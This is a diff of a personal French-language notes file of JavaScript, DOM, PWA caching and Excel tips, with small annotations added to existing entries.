+                                                                              opt[j].style.display="none";     // ou =null pour style.height=null
                                                                             }
                                                                         });                
                                                                       }
@@ -26495,7 +26503,7 @@ quand un lien n'a qu'un onclick pour eviter que la page remonte en haut quand on
       ou en html
       style="cursor:pointer"
 pour qu'un objet a une fleche multidirectionelle quand on place le curseur cursor souris dessus utile pour les drag and drop:  
-      this.style.cursor="move";
+      this.style.cursor="move"; // pour garder la fleche normale: "default"
       ou en html
       style="cursor:move"      
 pour rendre un div editable en html: 
@@ -26948,7 +26956,7 @@ tester le javascript TDD :
                                                    toBe                        //toBe egalité simple
                                                    toBeNull
                                                    toBeUndefined!=toBeDefined
-						   toBeEqual // teste egalitee entre deux objets
+						   toBeEqual // Marche plus on dirait teste egalitee entre deux objets
                                                    toBeTruthy() // equivalent de isTrue
                                                    toBeFalsy() // equivalent de isFalse
                                                    toContain // regarde si une liste contient un truc
@@ -27094,6 +27102,8 @@ erreur: (intermediate value)(...) is not a function
     
     lambda en javascript fonctionnal programing :functionnal programing :
         var newNumbers = tableau.filter(function(number,indexFacultatif){ // indexFacultatif si on a besoin de l'index ouaou.:-)
+			contraction: filter((number,indexFacultatif)=>{return xxxx}); ou filter((number,indexFacultatif)=>uncalculSiJeMetsPasReturn)
+		.find(....) // comme filter mais retourne que LE PREMIER element qu'il trouve sans embarquer toute l'arbo comme filter/javascript :
               return (number % 2 !== 0); //filtrer. doit retourner un boolean// ne rien modifier dedans
           }).map(function(numberEstLeFils,indexFacultatif){ // on peut aussi faire dujson.map(unemethodeTemplate) avec function unemethodeTemplate(json){return 'bla${json.propriete}bli'} templating du json!
               return numberEstLeFils * 2; // Modifier. Ne pas modifier d'objets externes la dedans
@@ -27108,6 +27118,8 @@ erreur: (intermediate value)(...) is not a function
                     ou(index,value)   
                 doSomethingWith(number); // faire un traitement... a creuser
             });;
+	pour faire un minus: tableau1 minus tableau2: moins, soustraire
+		console.log("minus :"); console.log(talkingActors.filter(actor=>shuttedUpActors.indexOf(actor) < 0));
 	si c'est un NodeList faire Array.from(lanodelist).forEach(....
         par exemple cherche dans un tableau si les valeurs existent dans un autre tableau: boucle imbriquee:
           if(unTableauAParcourir.filter(function(act,idx){return unAutreTableauAParcourir.filter(function(actor){return actor == idx;}).length>0;})
@@ -27381,7 +27393,7 @@ pour detecter si navigateur peut lire vorbid audio mp3:
                           var el = evt.target,
                               x = 0,
                               y = 0;
-                        
+                       NAN 
                           while (el && !isNaN(el.offsetLeft) && !isNaN(el.offsetTop)) {
                             x += el.offsetLeft - el.scrollLeft;
                             y += el.offsetTop - el.scrollTop;
@@ -27777,7 +27789,7 @@ recuperer des elements par leur nom de classe: pour ajouter des elements à un t
     document.getElementsByClassName("nomboucle") (byclass par classe)
 et si on veut merger plusieurs elements ayant des classesnames differents dans une seule liste faire: 
       var buttonToReduce = Array.prototype.slice.call(document.getElementsByClassName("button"), 0);// equivalent de [].slice.call(etc...)
-			var buttonToReduce = buttonToReduce.concat(Array.prototype.slice.call(document.getElementsByClassName("buttonclose"), 0));
+			var buttonToReduce = buttonToReduce.concat(Array.prototype.slice.call(document.getElementsByClassName("buttonclose"), 0)); // oui c'est bien concat sur un tableau et pas un string
 			var buttonToReduce =  buttonToReduce.concat(Array.prototype.slice.call(document.getElementsByClassName("buttonmove"), 0));
 			var buttonToReduce =  buttonToReduce.concat(Array.prototype.slice.call(document.getElementsByClassName("switch2"), 0));
 			var buttonToReduce =  buttonToReduce.concat(Array.prototype.slice.call(document.getElementsByClassName("buttonActive"), 0));
@@ -27855,6 +27867,7 @@ activer la fenêtre courante:
     self.focus();
 introspection:
                           var func = tool[ev.type];  // ouaou!! c'est puissant! func c'est la fonction dont le nom est "ev.type" de l'objet tool qui est tool_pencil en fait c'est de l'introspection!
+				tool["nomDuneFunction"](argument1,parametre2);
 pour instancier une classe par reverseintrospection classname est un string
     var classname="blablamaclasse";                          
     var subcs  = window[classname];   
@@ -28302,7 +28315,7 @@ pour faire un drag and drop avec html5:
 pour setter le name l'attribut la propriete d'un element tag html:  
         the element normally does not have a name attribute, so setting the DOM property like that myelement.name="toto" won't work.
         For example, setting the name property on an input element will work. Setting it on a div will not.
-        It will work, however, with myelement.setAttribute("name","toto").
+        It will work, however, with myelement.setAttribute("name","toto"). // ne pas mettre de boolean, toujours string
 generer une image à la volee:
         var img=new Image();
        img.src="clearmute.png";
@@ -28561,6 +28574,7 @@ pour deplacer un objet du dom
     document.querySelector("#prompt>#prompt1>div").appendChild(document.getElementById('blah'));
 pour placer ajouter inserer dans un element un objet quelquepart (puissant!)
 elementDansQUoiJeVeuxAjouter.insertAdjacentElement('afterbegin', elementaajouter); //beforebegin ou afterbegin ou beforeend ou afterend // si j'ai erreur insertAdjacentElement' on 'Element': parameter 2 is not of type 'Element' "document-fragment" parce que j'utilise un template: essayer methode LINKhgjhjhjhjh    
+remplacer un dom par un autre: elementParent.replaceChild(nouveaudom,ancienadegager)
 pour placer dans le dom un objet avant: LINKhgjhjhjhjh 
   unElementParent.insertBefore(nouvelobjet,unFilsAvantQuiJeVeuxMettre);
 localstorage: memoire permanente sur un browser:
@@ -29322,7 +29336,7 @@ METHODE CLASS: THEBEST? classes es6
                                                                      cloneDuTemplate.querySelector(...).innerText=untruc;
                                                                        mondiv ou thisSiJeSuisDansUneClasseHtmlElement.appendChild(cloneDuTemplate); // ajoute le template dans la page (devient visible) MARCHE PAS
                                                         findansuneboucleparex
-                                                        div.setAttribute('unAttributduTagHtml','valeurDeLattribut'); PIEGE! utiliser ça et ne pas utiliser unElementHTML.unattribut=xxx (ca ne modifie que la classe pas le html et du coup attributeChangedCallback n'est pas appele)
+                                                        div.setAttribute('unAttributduTagHtml','valeurDeLattributStringPasBoolean'); PIEGE! utiliser ça et ne pas utiliser unElementHTML.unattribut=xxx (ca ne modifie que la classe pas le html et du coup attributeChangedCallback n'est pas appele)
                                                         
                                                         on peut ajouter un listnener au slot si celui ci change en javascript: par contre si je veux modifier le innerhtml du slot voir LINKrmvEvntListner
                                                             monslot.addEventListener('slotchange', e => {
@@ -29832,7 +29846,7 @@ PWA : progressive webapps :
 						});
 						function precache() {
 						  return caches.open(cacheVersion).then(function (cache) {
-						    return cache.addAll(cacheFiles);
+						    return cache.addAll(cacheFilesDoitEtreUneArrayD'URL); // ca direct enregistre les requests ET leurs responses respectives dans le cache 
 						  }).catch(err=>{console.log("WORKER ERR: "+err)})
 						}
 
@@ -33274,6 +33288,7 @@ pour masquer le quadrillage lignes, colonnes:
 Si les lignes ne s'ajustent pas automatiquement: tout ne rentre pas dans la case
   c'est parce que j'ai ecrit en gras et en gras ca prend plus de place dans la case mais pour autant la ligne n'ajuste pas sa hauteur: solution: augmenter un peu la taille de la police
 fichier locke: apparition du nom de la personne qui locke. 
+	pour savoir quel process locke un fichier faire resmon.exe > CPU > Associated Handles > tapper le fichier locke > il trouve le process qui fait chier
         Pour que votre nom apparaisse en clair, au lieu de votre IPN, lors d'une tentative d'accès 9 à un fichier Office (comme dans le message ci-dessous), cliquez sur "Outils - Options - General" dans Excel (ou "Outils - Options - Utilisateur" dans Word), et saisissez votre nom dans le champ "Nom d'utilisateur".
 pour faire des mises en forme conditionnelles illimitees
 		      voir le fichier MFC rapide illimite.xls que j'ai mis dans mon repertoire Laurent.
